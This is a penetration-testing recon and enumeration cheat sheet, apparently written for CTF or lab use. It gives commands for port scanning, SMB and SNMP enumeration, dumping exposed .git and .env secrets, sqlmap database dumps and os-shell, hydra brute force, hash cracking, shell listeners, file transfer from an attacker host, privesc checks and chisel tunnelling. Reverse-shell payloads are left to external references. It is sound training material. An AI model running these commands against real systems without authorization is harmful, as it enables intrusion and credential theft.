# Recon & Enumeration Cheat Sheet

A working reference of the standard recon and enumeration tools by category: what each is for, when to reach for it, and example commands. Built to sit next to Poly.

> **Authorization:** run these only against targets you have explicit, written authorization to test. Replace `TARGET` / `URL` / `IP` with your authorized target, and nothing else.
>
> **On payloads:** this sheet gives full commands for recon, enumeration, and the methodology around a foothold and privesc. For the actual attack payloads (reverse shells, exploit strings, generated shellcode) it points you to the standard references: **PayloadsAllTheThings**, **HackTricks**, **revshells.com**, **GTFOBins**. You craft and run those yourself.

## Contents

1. Methodology and workflow
2. Host discovery and port scanning
3. Service enumeration by port
4. Web enumeration
5. Reading exposed files (.env, .git, source)
6. Web exploitation (tools and methodology)
7. Password and hash attacks
8. Shells and foothold handling
9. Privilege escalation
10. Pivoting and tunneling
11. OSINT
12. Common ports reference
13. Wordlist locations

---

## 1. Methodology and workflow

The loop that wins points:

1. **Scan** the host: `nmap -sV -sC`, then `searchsploit --nmap` on the output.
2. **Enumerate** every open service (section 3). Most footholds come from enumeration, not exploits.
3. **Read** anything exposed (`.env`, `.git`, configs, source).
4. **Attack** the weakest point by hand with the right tool.
5. **Foothold:** stabilize the shell, then enumerate for privesc.
6. **Loot and pivot:** grab creds, reach deeper hosts.
7. **Log every step.** Keep notes as you go so the engagement writeup explains *how*.

General rule: if a tool gives output you do not understand, that is the next thing to go learn, not skip.

---

## 2. Host discovery and port scanning

### nmap
```
# discovery (find live hosts on a subnet)
nmap -sn 10.10.10.0/24

# fast full-TCP then targeted version scan (two-step is faster than -p- -sV)
nmap -p- --min-rate 5000 -T4 TARGET -oN ports.txt
nmap -sV -sC -p 22,80,443 TARGET -oN services.txt

# UDP (DNS 53, SNMP 161, TFTP 69, NTP 123 live here)
nmap -sU --top-ports 50 TARGET

# NSE scripts: discovery and known-vuln detection
nmap --script vuln TARGET
nmap --script "http-*" -p 80 TARGET
nmap --script smb-enum-shares,smb-os-discovery -p 445 TARGET
nmap --script ftp-anon,ftp-syst -p 21 TARGET

# save XML for searchsploit
nmap -sV -oX scan.xml TARGET && searchsploit --nmap scan.xml
```

### rustscan / masscan (faster port sweeps)
```
rustscan -a TARGET -- -sV -sC          # all ports fast, hands off to nmap
masscan -p1-65535 TARGET --rate 1000
```

---

## 3. Service enumeration by port

### FTP (21)
```
nmap --script ftp-anon -p21 TARGET
ftp TARGET                              # try anonymous / anonymous
wget -r ftp://anonymous:@TARGET/        # pull everything if anon works
```

### SSH (22)
```
ssh user@TARGET                         # banner tells you the OS/version
ssh-audit TARGET                        # supported algos, known issues
# weak creds: see hydra in section 7
```

### SMTP (25)
```
nmap --script smtp-enum-users,smtp-commands -p25 TARGET
# VRFY/EXPN user enumeration with a wordlist (smtp-user-enum)
smtp-user-enum -M VRFY -U users.txt -t TARGET
```

### DNS (53)
```
dig TARGET                              # basic
dig axfr @TARGET domain.local             # zone transfer (jackpot if allowed)
dnsrecon -d domain.local -t axfr
host -t ns domain.local
```

### HTTP/HTTPS (80/443/8080/8443)
See section 4.

### POP3/IMAP (110/143), and their TLS ports (995/993)
```
nc TARGET 110                           # USER / PASS, then LIST / RETR
```

### SMB (139/445) - very common foothold
```
enum4linux-ng -A TARGET
smbclient -L //TARGET/ -N              # list shares, null session
smbclient //TARGET/share -N            # connect to a share
smbmap -H TARGET                        # readable/writable shares at a glance
nmap --script smb-enum-shares,smb-enum-users -p445 TARGET
crackmapexec smb TARGET -u '' -p ''     # null auth, host info
crackmapexec smb TARGET -u user -p pass --shares
```

### SNMP (161/udp)
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET
snmpwalk -v2c -c public TARGET          # dump the MIB (users, processes, routes)
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25   # Windows user accounts
```

### LDAP (389/636)
```
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=local"
nmap --script ldap-rootdse -p389 TARGET
```

### RPC (111/135)
```
rpcinfo -p TARGET
rpcclient -U "" -N TARGET               # then: enumdomusers, querydominfo
```

### NFS (2049)
```
showmount -e TARGET                     # exported shares
mkdir /mnt/nfs && mount -t nfs TARGET:/export /mnt/nfs
```

### Databases
```
mysql -h TARGET -u root -p
psql -h TARGET -U postgres
redis-cli -h TARGET                     # then: INFO, KEYS *
mongo --host TARGET
```

---

## 4. Web enumeration

### Fingerprint
```
whatweb -a 3 URL
curl -sI URL                            # headers, server, cookies, redirects
```

### Content and path discovery
```
gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip,html
feroxbuster -u URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
ffuf -u URL/FUZZ -w common.txt -mc 200,204,301,302,307,401,403
dirb URL
```

### Subdomain and vhost discovery
```
ffuf -u URL -H "Host: FUZZ.domain.local" -w subdomains.txt -fs <baseline-size>
gobuster dns -d domain.local -w subdomains.txt
subfinder -d domain.local ; amass enum -d domain.local
```

### Parameter discovery
```
arjun -u "URL/page"                     # find hidden GET/POST params
ffuf -u "URL/page?FUZZ=1" -w params.txt -fs <baseline>
```

### Broad vuln sweep
```
nikto -h URL -maxtime 120s
nuclei -u URL                           # templated known-issue checks
```

### Always do by hand
```
curl -s URL/robots.txt URL/sitemap.xml
curl -s URL/.git/HEAD URL/.env URL/.svn/entries
# view source + comments, check for /admin, /api, /backup, /dev
```

---

## 5. Reading exposed files

### `.env`
```
curl http://TARGET/.env
```
Grab `DB_PASSWORD`, `APP_KEY`, `*_API_KEY`, `AWS_*`, `MAIL_*`. Reuse creds against the DB (`mysql -h TARGET -u user -p`), SSH, and any admin panel.

### `.git`
```
pip install git-dumper
git-dumper http://TARGET/.git/ ./loot && cd loot
git log --all                           # includes "removed" commits
git show <commit>
git stash list ; git diff
grep -ri "password\|secret\|api_key\|token\|BEGIN RSA" .
```
Payoff: secrets hidden in history + the real source (read queries to craft injections, find hidden endpoints, understand auth).

### `.svn`, backups, editor leftovers
```
curl -s URL/.svn/wc.db
# try: index.php.bak, config.php~, .DS_Store, backup.zip, site.tar.gz
```

---

## 6. Web exploitation (tools and methodology)

Tools and when to use them. Craft payloads yourself using HackTricks and PayloadsAllTheThings.

### SQL injection - sqlmap
When: a parameter errors on a quote or changes on `1 AND 1=1`.
```
sqlmap -u "URL/page?id=1" --batch --dbs
sqlmap -u "URL/page?id=1" --batch -D <db> --tables
sqlmap -u "URL/page?id=1" --batch -D <db> -T <table> --dump
sqlmap -r request.txt --batch            # feed a saved Burp request (POST, cookies, headers)
sqlmap -u "URL" --batch --os-shell       # only on boxes you own
```

### Burp Suite (Community)
Proxy browser to `127.0.0.1:8080`. Intercept, send to Repeater, tamper and replay. Core for auth logic, IDOR, injection, and anything you must shape precisely.

### Issue classes - how to recognize and test
- **XSS:** input reflected in the page. Test with a harmless marker, then a script context. If cookies lack HttpOnly, session theft is possible.
- **LFI/RFI:** `?page=/etc/passwd`, `php://filter/convert.base64-encode/resource=index`. RFI if it fetches a remote URL.
- **Command injection:** value lands in a shell. Separators `;` `|` `&&` `` ` `` `$( )`.
- **Path traversal:** `../../../../etc/passwd`, URL/double-encoded variants.
- **SSTI:** template engines; `{{7*7}}` returning `49` is the tell.
- **SSRF:** server fetches a URL you control; pivot to internal services / cloud metadata.
- **XXE:** XML input; external entity to read local files.
- **IDOR:** change an id in the request and see someone else's data.
- **File upload:** bypass extension/content-type filters to drop a webshell (see refs).

### JWT - jwt_tool
```
jwt_tool <token>                        # decode + highlight weaknesses
jwt_tool <token> -C -d wordlist.txt     # crack a weak HMAC secret
```

---

## 7. Password and hash attacks

### Online brute force - hydra
When: a login you may test and you have a user or small list.
```
hydra -l admin -P rockyou.txt TARGET ssh
hydra -L users.txt -P rockyou.txt TARGET ftp
hydra -l admin -P rockyou.txt TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```
`medusa` and `patator` are alternatives with the same idea.

### Identify a hash
```
hash-identifier
hashid '<hash>'
```

### Offline cracking - john and hashcat
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
hashcat -m 0 hash.txt rockyou.txt        # 0=MD5  100=SHA1  1800=sha512crypt  3200=bcrypt
hashcat -m 1000 ntlm.txt rockyou.txt     # NTLM
hashcat -m 0 -a 3 hash.txt '?l?l?l?l?d?d' # mask/brute
```

### Turn files into crackable hashes (`*2john`)
```
zip2john secret.zip > zip.hash ; john zip.hash
ssh2john id_rsa > key.hash ; john key.hash
# also: pdf2john, office2john, rar2john, keepass2john
fcrackzip -u -D -p rockyou.txt secret.zip
pdfcrack -f file.pdf -w rockyou.txt
```

---

## 8. Shells and foothold handling

Generate the reverse-shell payload at **revshells.com** or PayloadsAllTheThings. This section covers catching and using one.

### Catch a shell
```
nc -lvnp 4444                           # basic listener
rlwrap nc -lvnp 4444                    # with readline (arrow keys, history)
```

### Stabilize a raw shell (do this first, every time)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then on your box:
stty raw -echo; fg
# back in the shell:
export TERM=xterm; stty rows 40 columns 160
```

### Transfer files to the target
```
# on your box:
python3 -m http.server 80
# on the target:
wget http://IP/linpeas.sh ; curl http://IP/file -o file
```

Payload generation (msfvenom, webshells) and Metasploit exploitation are run from their own docs against boxes you own. Keep that off shared machines.

---

## 9. Privilege escalation

### Linux
```
sudo -l                                 # misconfigured sudo is the #1 win
id ; groups ; uname -a                  # context + kernel version
find / -perm -4000 2>/dev/null          # SUID
getcap -r / 2>/dev/null                 # capabilities
cat /etc/crontab ; ls -la /etc/cron.*   # cron jobs you can hijack
```
Cross-reference SUID binaries, sudo entries, and capabilities against **GTFOBins**. Automated enum (run on boxes you own):
```
./linpeas.sh | tee linpeas.txt
```

### Windows
```
whoami /priv                            # SeImpersonate etc.
systeminfo                              # patch level for kernel exploits
```
Run **winPEAS**; map findings with HackTricks Windows privesc. Specific exploits come from their own writeups.

---

## 10. Pivoting and tunneling

When nmap must reach hosts behind a foothold ("outside the local subnet").
```
# SSH local/remote/dynamic forwards
ssh -L 8080:internal:80 user@pivot      # reach internal:80 at localhost:8080
ssh -D 1080 user@pivot                  # SOCKS proxy, then use proxychains
proxychains nmap -sT internal

# chisel (when you cannot SSH)
# server (your box):   chisel server -p 8000 --reverse
# client (target):     chisel client YOUR_IP:8000 R:socks

# ligolo-ng is the modern, cleaner option for the same job
```

---

## 11. OSINT

```
exiftool photo.jpg                       # metadata, GPS
theHarvester -d example.com -b all       # emails, subdomains, hosts
sherlock username                        # find the handle across sites
maigret username                         # deeper account search
whois domain.local
```
- **recon-ng** - interactive framework; create a workspace, load modules (many need API keys).
- Google dorks: `site:`, `filetype:pdf`, `intitle:index.of`, `inurl:admin`.
- Wayback Machine (web.archive.org) for old versions; **shodan.io** for exposed services.
- Reverse image: Google Lens, Yandex (best for faces/places).

---

## 12. Common ports reference

| Port | Service | First thing to try |
|---|---|---|
| 21 | FTP | anonymous login, `ftp-anon` |
| 22 | SSH | banner/version, weak creds |
| 25 | SMTP | user enumeration (VRFY) |
| 53 | DNS | zone transfer (`dig axfr`) |
| 80/443 | HTTP(S) | whatweb, gobuster, robots, /.git, /.env |
| 110/143 | POP3/IMAP | read mail with creds |
| 139/445 | SMB | enum4linux, smbclient null session |
| 161 | SNMP | snmpwalk public |
| 389 | LDAP | ldapsearch anonymous |
| 2049 | NFS | showmount -e, mount |
| 3306 | MySQL | weak/reused creds |
| 3389 | RDP | creds, `rdesktop`/`xfreerdp` |
| 5432 | Postgres | default creds |
| 6379 | Redis | unauth `redis-cli` |
| 8080/8443 | HTTP alt | same as web, often admin/dev |

---

## 13. Wordlist locations (Kali/Parrot)

```
/usr/share/wordlists/rockyou.txt                     # the password list (gunzip it once)
/usr/share/wordlists/dirb/common.txt                 # quick dir brute
/usr/share/seclists/                                 # the big collection:
  Discovery/Web-Content/raft-*-words.txt             #   web content
  Discovery/DNS/subdomains-top1million-5000.txt      #   subdomains
  Usernames/top-usernames-shortlist.txt              #   users
  Passwords/                                          #   more password lists
```
Install SecLists if missing: `sudo apt install seclists`.

---

Keep this next to `poly.py`. During a box, work top-to-bottom: scan, enumerate every port, read what is exposed, attack the weak point, foothold, escalate, pivot, and write down each step as you go.
